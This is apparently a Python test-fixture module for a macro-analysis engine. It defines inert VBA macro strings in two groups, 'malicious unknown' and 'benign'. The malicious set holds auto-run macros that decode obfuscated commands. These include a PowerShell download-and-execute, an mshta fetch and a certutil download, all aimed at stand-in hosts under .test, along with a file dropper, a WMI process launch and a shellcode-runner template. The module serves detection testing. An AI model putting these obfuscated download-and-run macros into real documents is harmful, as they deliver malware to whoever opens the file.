# ruff: noqa: E501  (macro source is written out as long literal lines)
"""Inert macro source for the macro-analysis tests and the corpus. Nothing here can run: it is text
that tests read, written for this project, using made-up hosts under .test.

The MALICIOUS_UNKNOWN macros are written so that a plain keyword search finds little or nothing in
their text: the commands only exist after the macro's own decoders ran, or the macro's SHAPE is
the giveaway. They are the unknowns the analysis in ADR-023 is for. The BENIGN macros are ordinary
office automation, chosen to use the same features (Declare, CreateObject, Chr, hex, properties)."""


def hexed(text: str) -> str:
    return text.encode().hex().upper()


def xored(text: str, key: int) -> str:
    return ", ".join(str(ord(c) ^ key) for c in text)


DECODER = """Private Function Dec(ByVal s As String) As String
    Dim i As Long, r As String
    For i = 1 To Len(s) Step 2
        r = r & Chr(Val("&H" & Mid(s, i, 2)))
    Next i
    Dec = r
End Function
"""

# ---- unknown malicious macros -------------------------------------------------------------------
M_HEX_DECODER = (
    DECODER
    + f"""Sub AutoOpen()
    Dim c As String, o As Object
    c = Dec("{hexed("cmd /c powershell -nop -w hidden -c iex (new-object net.webclient).downloadstring('http://payload.test/s')")}")
    Set o = CreateObject(Dec("{hexed("WScript.Shell")}"))
    o.Run c, 0
End Sub
"""
)

M_XOR_WINEXEC = f"""Private Declare PtrSafe Function WinExec Lib "kernel32" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long
Sub Document_Open()
    Dim k, i As Long, r As String
    k = Array({xored("mshta http://payload.test/a.hta", 55)})
    For i = 0 To UBound(k)
        r = r & Chr(k(i) Xor 55)
    Next i
    WinExec r, 0
End Sub
"""

M_PROPERTIES_LOADER = """Sub Document_Open()
    Dim p As String
    p = ActiveDocument.BuiltInDocumentProperties("Comments")
    CallByName CreateObject(Left(p, 13)), "Run", VbMethod, Mid(p, 15), 0
End Sub
"""

M_CALLBYNAME_CHAIN = (
    DECODER
    + f"""Sub Workbook_Open()
    Dim sa As Object
    Set sa = CreateObject(Dec("{hexed("Shell.Application")}"))
    CallByName sa, "Shell" & "Execute", VbMethod, Dec("{hexed("powershell.exe")}"), Dec("{hexed("-nop -w hidden -enc SQBFAFgA")}")
End Sub
"""
)


def shifted(text: str, k: int = 3) -> str:
    return "".join(chr(ord(c) + k) for c in text)


_MONIKER = shifted("winmgmts:\\\\.\\root\\cimv2")
_CLASS = shifted("Win32_Process")
_COMMAND = shifted("cmd /c start /min calc.exe")
M_CAESAR_WMI = f"""Private Function Sh(ByVal s As String, ByVal k As Long) As String
    Dim i As Long
    For i = 1 To Len(s)
        Sh = Sh & Chr(Asc(Mid(s, i, 1)) - k)
    Next i
End Function
Sub AutoOpen()
    Dim w As Object
    Set w = GetObject(Sh("{_MONIKER}", 3))
    w.Get(Sh("{_CLASS}", 3)).Create Sh("{_COMMAND}", 3), Null, Null, 0
End Sub
"""

M_FILE_DROP = (
    DECODER
    + f"""Sub AutoOpen()
    Dim p As String
    p = Environ("TEMP") & "\\updater.vbs"
    Open p For Output As #1
    Print #1, Dec("{hexed("Set x = CreateObject(" + chr(34) + "WScript.Shell" + chr(34) + "): x.Run " + chr(34) + "cmd /c calc" + chr(34))}")
    Close #1
    CreateObject(Dec("{hexed("Shell.Application")}")).Open p
End Sub
"""
)

M_REVERSED_DOWNLOAD = """Sub Auto_Open()
    Dim u As String, c As String
    u = StrReverse("txt.p/tset.daolyap//:ptth")
    c = StrReverse("exe.dmc") & " /c " & StrReverse("ehcacru- litrutrec") & " -f " & u & " %TEMP%\\p.exe"
    CreateObject(StrReverse("llehS.tpircSW")).Run c, 0
End Sub
"""

M_SHELLCODE_RUNNER = (
    """Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal a As Long, ByVal b As Long, ByVal c As Long, ByVal d As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal d As LongPtr, ByRef s As Any, ByVal l As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal a As Long, ByVal b As Long, ByVal c As LongPtr, d As Long, ByVal e As Long, f As Long) As LongPtr
Sub AutoOpen()
    Dim b, i As Long, m As LongPtr
    b = Array("""
    + ", ".join(str((i * 7) % 256) for i in range(64))
    + """)
    m = VirtualAlloc(0, UBound(b), &H3000, &H40)
    For i = 0 To UBound(b)
        RtlMoveMemory m + i, b(i), 1
    Next i
    CreateThread 0, 0, m, 0, 0, 0
End Sub
"""
)

# One finding each, no auto-run entry: the smallest macros that fire a single new rule
MIN_HIDDEN = 'Sub Build()\n    x = StrReverse("llehS.tpircSW")\nEnd Sub\n'
MIN_API = 'Private Declare PtrSafe Function WinExec Lib "kernel32" (ByVal c As String, ByVal n As Long) As Long\nSub Helper()\nEnd Sub\n'
MIN_DROP = """Sub Save()
    Dim p As String
    p = Environ("TEMP") & "\\x.txt"
    Open p For Output As #1
    Print #1, "data"
    Close #1
    CreateObject("WScript.Shell").Run p, 1
End Sub
"""

MALICIOUS_UNKNOWN: dict[str, str] = {
    "hex_decoder": M_HEX_DECODER,
    "xor_winexec": M_XOR_WINEXEC,
    "properties_loader": M_PROPERTIES_LOADER,
    "callbyname_chain": M_CALLBYNAME_CHAIN,
    "caesar_wmi": M_CAESAR_WMI,
    "file_drop": M_FILE_DROP,
    "reversed_download": M_REVERSED_DOWNLOAD,
    "shellcode_runner": M_SHELLCODE_RUNNER,
}
# Macros whose text a keyword search finds NO program-running, downloading or injecting word in
# (measured, and re-measured by the tests): the analysis in ADR-023 is what finds these.
HIDDEN_FROM_KEYWORDS = {"xor_winexec", "properties_loader", "caesar_wmi", "reversed_download"}


def judge(source: str, pcode: bytes = b"") -> tuple[str, int | None, set[str]]:
    """The whole-file verdict for a document carrying this macro: (state, risk, rule ids)."""
    import hashlib

    import deephelp
    from mailhelp import in_process_file

    from core.files.engine import analyze_file

    data = deephelp.ole_with_macro(source, pcode=pcode)
    report = analyze_file(
        "invoice.doc", len(data), hashlib.sha256(data).hexdigest(), data, run=in_process_file
    ).report
    v = report.verdict
    return v.state.value, v.risk_score, {s.rule_id for s in v.signals}


# ---- ordinary macros ----------------------------------------------------------------------------
B_REPORT = """Sub FormatReport()
    Dim i As Long
    For i = 1 To 200
        Cells(i, 1).Value = i
        Cells(i, 2).Formula = "=A" & i & "*2"
        If i Mod 10 = 0 Then Rows(i).Font.Bold = True
    Next i
    Range("A1:B200").Columns.AutoFit
End Sub
"""

B_FSO_EXPORT = """Sub ExportCsv()
    Dim fso As Object, f As Object, i As Long
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.CreateTextFile(Environ("USERPROFILE") & "\\Documents\\export.csv", True)
    For i = 1 To 50
        f.WriteLine Cells(i, 1).Value & "," & Cells(i, 2).Value
    Next i
    f.Close
End Sub
"""

B_TIMING_API = """Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal ms As Long)
Private Declare PtrSafe Function GetAsyncKeyState Lib "user32" (ByVal k As Long) As Integer
Sub Pause2()
    Dim t As Long
    t = GetTickCount()
    Do While GetTickCount() - t < 2000
        Sleep 50
        DoEvents
    Loop
End Sub
"""

B_HEX_COLOURS = """Function HexToRgb(ByVal h As String) As Long
    HexToRgb = RGB(Val("&H" & Mid(h, 1, 2)), Val("&H" & Mid(h, 3, 2)), Val("&H" & Mid(h, 5, 2)))
End Function
Sub Paint()
    Range("A1").Interior.Color = HexToRgb("3366FF")
End Sub
"""

B_STAMP_PROPERTIES = """Sub Document_Open()
    ActiveDocument.BuiltInDocumentProperties("Author") = Environ("USERNAME")
    ActiveDocument.BuiltInDocumentProperties("Comments") = "Opened " & Format(Now, "yyyy-mm-dd")
End Sub
"""

B_RUN_BY_NAME = """Sub Dispatcher()
    Application.Run "Module1.Refresh"
    CallByName Me, "Update", VbMethod
End Sub
"""

B_ROT13_PUZZLE = """Function Rot13(ByVal s As String) As String
    Dim i As Long, c As Long
    For i = 1 To Len(s)
        c = Asc(Mid(s, i, 1))
        If c >= 97 And c <= 122 Then c = (c - 97 + 13) Mod 26 + 97
        Rot13 = Rot13 & Chr(c)
    Next i
End Function
Sub Puzzle()
    MsgBox Rot13("uryyb jbeyq")
End Sub
"""

B_OUTLOOK_MAIL = """Sub Document_Open()
    Dim ol As Object
    Set ol = CreateObject("Outlook.Application")
    ActiveDocument.Variables("Last").Value = Format(Now, "yyyy-mm-dd")
End Sub
"""

B_OPEN_NOTEPAD = """Sub OpenNotes()
    Shell "notepad.exe", vbNormalFocus
End Sub
"""

B_HTML_BUILDER = (
    'Function Page() As String\n    Dim h As String\n    h = "<html><body>"\n'
    + "".join(
        f'    h = h & "<p>Line {i}: " & Cells({i}, 1).Value & "</p>" & vbCrLf\n'
        for i in range(1, 70)
    )
    + '    Page = h & "</body></html>"\nEnd Function\n'
)

BENIGN: dict[str, str] = {
    "report": B_REPORT,
    "fso_export": B_FSO_EXPORT,
    "timing_api": B_TIMING_API,
    "hex_colours": B_HEX_COLOURS,
    "stamp_properties": B_STAMP_PROPERTIES,
    "run_by_name": B_RUN_BY_NAME,
    "rot13_puzzle": B_ROT13_PUZZLE,
    "outlook_mail": B_OUTLOOK_MAIL,
    "open_notepad": B_OPEN_NOTEPAD,
    "html_builder": B_HTML_BUILDER,
}
